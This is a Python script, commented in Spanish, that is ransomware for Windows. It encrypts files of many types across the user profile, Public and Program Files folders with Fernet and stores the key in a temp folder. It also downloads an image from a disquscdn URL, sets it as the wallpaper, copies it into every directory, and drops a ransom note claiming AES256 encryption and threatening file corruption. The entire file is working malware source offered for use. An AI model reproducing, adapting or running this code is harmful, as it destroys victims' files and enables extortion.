#OMAIGAH

#Mi magna opera magistralis.

from cryptography.fernet import Fernet
import os , time , ctypes , requests , threading

def set_wallpaper(img):
    ctypes.windll.user32.SystemParametersInfoW(20 , 0 , img , 0)

def download_and_multiply_img():
    url = "https://uploads.disquscdn.com/images/7a74b0164767415efdb411250acac618b1cd8fe73b3b14e58de8c18022f9c20f.jpg?w=600&h=377"
    
    response = requests.get(url)
    ruta_2 = os.getenv("userprofile") + "\\Desktop\\AYUMU_FIND_YOU.jpg"
    
    with open(ruta_2 , "wb") as ayumu:
        ayumu.write(response.content)
        
    ruta = os.getenv("userprofile")
    set_wallpaper(ruta_2)
    
    Rutas_multply = list()
    Rutas_multply.append(ruta)
    
    with open(ruta_2 , "rb") as mul:
        ayumu_bytes = mul.read()
    
    
    for y in Rutas_multply:
            try:
                KK = os.listdir(y)
                for i in KK:
                    if os.path.isdir(f"{y}\\{i}"):
                        for b in range(2):
                            with open(y + f"\\AYUMU_FIND_YOU{b}.jpg" , "wb") as mm:
                                mm.write(ayumu_bytes)  
                        Rutas_multply.append(f"{y}\\{i}")
                       
                    else:
                        pass
            except:
                pass
            
def key():
        
    with open("C:\\Windows\\Temp\\key.key" , "wb") as llave:
        llave.write(Fernet.generate_key())
        
    return open("C:\\Windows\\Temp\\key.key" , "rb").read()


def encryptado(paths , key):
    f = Fernet(key)
    e = (".jpg" , ".mp3" , ".mp4" , ".txt" , ".doc" , ".ppt" , ".xls" , ".html" , ".py" , ".c" , ".c#",".cpp" , ".go" , ".ico" , ".eml" , ".gif" , ".wav" , ".zip" , ".rar" , ".pdf" , ".iso" , ".mds" , ".docx" ,  ".bat" , ".mpeg" , ".ini" , "tar.gz" , "paf.exe" , ".search-ms" , ".lnk" , ".contact" , ".pid" , ".json" , ".url" , ".exe", ".xz" , ".png",  ".db")  
    
    for i in paths:
        try:
            if i.endswith(e):
                with open(i , "rb") as data:
                    datos = data.read()
                encrypted_data = f.encrypt(datos)
        
                with open(i , "wb") as w:
                    w.write(encrypted_data)
                    
            elif i.startswith("AYUMU_FIND_YOU"):
                pass
                
            else:
                agregar = Rutas_a_encriptar(i)
                paths.append(agregar)
        except Exception:
            pass
            
            
def Rutas_a_encriptar(ruta):
    e = (".jpg" , ".mp3" , ".mp4" , ".txt" , ".doc" , ".ppt" , ".xls" , ".html" , ".py" , ".c" , ".c#",".cpp" , ".go" , ".ico" , ".eml" , ".gif" , ".wav" , ".zip" , ".rar" , ".pdf" , ".iso" , ".mds" , ".docx" ,  ".bat" , ".mpeg" , ".ini" , "tar.gz" , "paf.exe" , ".search-ms" , ".lnk" , ".contact" , ".pid" , ".json" , ".url" , ".exe", ".xz" , ".png", ".lst" , ".pck" ,  ".db") 

    Ruta_completa = list()
    
    Rutas_2 = ["C:\\Users\\Public" , "C:\\Program Files(x86)" , "C:\\Program Files"]
    
    for a in Rutas_2:
        if os.path.exists(a):
            Ruta_completa.append(a)
        else:
            pass
    
    carpetas = os.listdir(ruta)
    
    for i in carpetas:
        excluir = (".regtrans-ms" , ".TM.blf" , ".LOG1" , ".LOG2" , ".ini" , ".DAT")
    
        if i.endswith(excluir):
            pass
        else:
            ruta_l = f"{ruta}\\{i}"
            Ruta_completa.append(ruta_l)
         
    for c in Ruta_completa:
        try:
            Archivos = os.listdir(c)
            for G in Archivos:
                if G.endswith(e):
                    Ruta_completa.append(f"{c}\\{G}")
                else:
                    Ruta_completa.append(f"{c}\\{G}")
        except Exception:
            pass
    return Ruta_completa

def main():
    PATH = os.getenv("userprofile")
    Rutas = Rutas_a_encriptar(PATH)
    llave = key()
    encryptado(Rutas , llave)
    
if __name__ == "__main__":
    
    Proceso1 = threading.Thread(target= main())
    Proceso2 = threading.Thread(target= download_and_multiply_img())
    
    Proceso1.start()
    Proceso2.start()
    
    Proceso1.join()
    Proceso2.join()
    
    with open(os.getenv("userprofile") + "\\Desktop\\Sirvio.txt" , "w") as Mora:
        Mora.write("Tu pc a sido encriptada en AES256 cualquier intento de tratar de desencriptarla terminara en archivos corruptos")